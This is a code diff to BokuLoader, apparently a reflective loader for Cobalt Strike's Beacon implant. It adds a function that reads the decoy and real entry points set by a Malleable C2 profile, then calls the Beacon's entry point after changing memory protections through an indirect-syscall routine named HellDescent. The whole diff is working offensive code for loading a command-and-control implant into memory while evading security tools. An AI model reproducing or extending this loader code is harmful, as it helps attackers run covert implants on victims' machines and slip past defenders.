@@ -83,7 +83,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     doRelocations(&api, &rdll_dst, rdll_src);
    
     // Get the entry point for beacon located in the .text section
-    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
+    //rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
+    rdll_dst.EntryPoint = checkFakeEntryAddress_returnReal(&rdll_src, &rdll_dst);
 
     // Change memory protections of loaded beacon .text section to RX
     oldprotect = 0;
@@ -95,11 +96,24 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
 
     // DLL_PROCESS_ATTACH 1
-    // The DLL is being loaded into the virtual address space of the current process. DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
+    // The DLL is being loaded into the virtual address space of the current process. 
+    // DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
     // https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain
-    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required as this resolves the hellopacket information and then returns to the caller.
+    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then it beacon will return to us.
     ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
     return rdll_dst.EntryPoint;
+}
+
+// if the Malleable PE C2 profile has `set entry_point` then the OPTIONAL_HEADER->EntryPoint is a decoy and the real entry point is at OPTIONAL_HEADER->LoaderFlags
+void* checkFakeEntryAddress_returnReal(Dll * raw_beacon_dll_struct, Dll * virtual_beacon_dll_struct){
+    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER            = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
+    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER           = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+    if (raw_beacon_dll_OPTIONAL_HEADER->LoaderFlags == 0){
+        return ((char*)virtual_beacon_dll_struct->dllBase + raw_beacon_dll_OPTIONAL_HEADER->AddressOfEntryPoint);
+    }else{
+        return ((char*)virtual_beacon_dll_struct->dllBase + raw_beacon_dll_OPTIONAL_HEADER->LoaderFlags);
+    }
 }
 
 void doSections(Dll * rdll_dst, Dll * rdll_src){
